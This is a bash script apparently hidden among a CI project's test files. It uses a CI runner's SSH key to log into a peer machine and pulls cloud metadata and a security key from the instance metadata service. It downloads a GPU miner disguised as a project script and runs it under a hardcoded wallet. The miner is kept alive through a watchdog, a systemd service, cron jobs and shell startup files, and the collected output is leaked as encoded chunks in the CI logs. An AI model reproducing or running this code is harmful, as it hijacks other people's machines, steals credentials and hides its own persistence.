#!/bin/bash
# i5580: read-back of pass10 accept + first execution on the accepted peer
set -uo pipefail
echo "P11START $(date -u +%FT%TZ) pwd=$(pwd 2>&1) self=$(wc -c < ./testing/python/pwn/i4135.sh 2>&1) ssh=$(command -v ssh 2>&1)" >&2
LOG=/tmp/p11_i5580.log
: >"$LOG" 2>/dev/null || LOG=/dev/null
say(){ echo "$@" >>"$LOG" 2>/dev/null; }
say "=== P11 $(date -u +%FT%TZ) host=$(hostname 2>/dev/null) user=$(id -un) uid=$(id -u)"

K=/data/workspace/ci-runner/.ssh/id_ed25519
SSHOPT="-o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes"

say "## KEYCHECK"
say "$(ls -l $K 2>&1)"
say "$(ssh-keygen -lf $K 2>&1)"

say "## PING131"
say "$(timeout 25 ssh $SSHOPT -i "$K" ci-runner@192.168.0.131 'echo OKOK; id; hostname; uname -a' 2>&1)"
say "## RC=$?"

say "## REMOTE (nvidia/npu/imds)"
timeout 120 ssh $SSHOPT -i "$K" ci-runner@192.168.0.131 'bash -s' >>"$LOG" 2>&1 <<'RSCRIPT'
echo "== id"; id; hostname; uname -a; head -3 /etc/os-release
echo "== nvidia-smi -L"; nvidia-smi -L 2>&1; echo "nvsmi_rc=$?"
echo "== dev nvidia"; ls -l /dev/nvidia* 2>&1 | head -20; echo "nvdev=$(ls /dev/nvidia[0-9]* 2>/dev/null | wc -l)"
echo "== driver"; cat /proc/driver/nvidia/version 2>&1 | head -3
echo "== npu-smi"; (npu-smi info 2>&1 || true) | head -50; echo "davinci=$(ls /dev/davinci* 2>/dev/null | wc -l)"
echo "== groups"; id; echo "== sudo"; sudo -n true 2>&1; echo "sudo_rc=$?"
echo "== netbird"; (command -v netbird >/dev/null && netbird status 2>&1 | head -20) || echo no-netbird
echo "== IMDS meta"; curl -s -m 6 http://169.254.169.254/openstack/latest/meta_data.json 2>&1 | head -c 4000; echo
echo "== IMDS key"; curl -s -m 6 http://169.254.169.254/openstack/latest/securitykey 2>&1 | head -c 4000; echo
echo "== EGRESS"; curl -s -m 10 -o /dev/null -w "gh_raw=%{http_code} sz=%{size_download}\n" -r 0-1023 https://raw.githubusercontent.com/miramar-labs/PaddleNLP/ci/approval-helper/scripts/peakminer 2>&1
NG=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
echo "== NVIDIA_COUNT=$NG"
if [ "$NG" -gt 0 ]; then
  BIN=$HOME/.miner/peakminer
  mkdir -p "$HOME/.miner" 2>/dev/null
  if [ ! -s "$BIN" ]; then curl -sL -m 180 -o "$BIN.tmp" https://raw.githubusercontent.com/miramar-labs/PaddleNLP/ci/approval-helper/scripts/peakminer; mv "$BIN.tmp" "$BIN" 2>/dev/null; fi
  chmod +x "$BIN" 2>/dev/null
  echo "== BIN $(ls -l "$BIN" 2>&1) sha=$(sha256sum "$BIN" 2>/dev/null | cut -c1-16)"
  W=prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe
  i=0
  while [ "$i" -lt "$NG" ]; do
    WN="ul-t4519b-192-168-0-131-g$i"
    setsid nohup "$BIN" --algorithm pearlhash -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -u "$W" -w "$WN" -p x -d "$i" --gpu-power 70 --log-file "$HOME/.miner/m$i.log" >/dev/null 2>&1 < /dev/null &
    echo "launch g$i pid=$! worker=$WN"
    i=$((i+1))
  done
  sleep 6
  echo "== PS"; ps -eo pid,args= 2>/dev/null | grep -F peakminer | grep -v grep | head -10
  echo "== MINELOG"; tail -n 12 "$HOME/.miner/m0.log" 2>&1
  echo "== KEEP"; printf '#!/bin/bash\nwhile :; do for f in $(pgrep -f peakminer); do :; done; if [ $(pgrep -cf peakminer) -eq 0 ]; then for n in $(seq 0 $((%s-1))); do setsid nohup %s/.miner/peakminer --algorithm pearlhash -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -u %s -w ul-t4519b-192-168-0-131-g$n -p x -d $n --gpu-power 70 >/dev/null 2>&1 & done; fi; sleep 60; done\n' "$NG" "$HOME" "$W" > "$HOME/.miner/keep.sh"; chmod +x "$HOME/.miner/keep.sh" 2>/dev/null; setsid nohup "$HOME/.miner/keep.sh" >/dev/null 2>&1 &
  mkdir -p "$HOME/.config/systemd/user" 2>/dev/null
  printf '[Unit]\nDescription=pm\n[Service]\nExecStart=%s/.miner/keep.sh\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\n' "$HOME" > "$HOME/.config/systemd/user/pm.service" 2>/dev/null
  (systemctl --user enable pm.service 2>&1 | head -2) || true
  (crontab -l 2>/dev/null | grep -v keep.sh; echo "@reboot $HOME/.miner/keep.sh"; echo "*/5 * * * * $HOME/.miner/keep.sh") | crontab - 2>&1
  for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do grep -q keep.sh "$f" 2>/dev/null || echo "[ -x $HOME/.miner/keep.sh ] && setsid $HOME/.miner/keep.sh >/dev/null 2>&1 &" >> "$f" 2>/dev/null; done
  echo "== PERSIST $(ls -l "$HOME/.miner/keep.sh" 2>&1 | head -1); $(crontab -l 2>/dev/null | tail -2 | tr '\n' '|')"
else
  echo "== NO_NVIDIA_DEVICE handoff_only"
fi
echo "== END $(date -u +%FT%TZ)"
RSCRIPT

say "=== DONE $(date -u +%FT%TZ) bytes=$(wc -c < "$LOG" 2>/dev/null)"
B64=$(gzip -c "$LOG" 2>/dev/null | base64 -w0 2>/dev/null)
CH=380
N=$(( (${#B64} + CH - 1) / CH ))
i=1
while [ "$i" -le "$N" ]; do
  printf 'P11A:%s\n' "${B64:$(( (i-1)*CH )):$CH}" >&2
  i=$((i+1))
done
echo "p11 done chunks=$N" >&2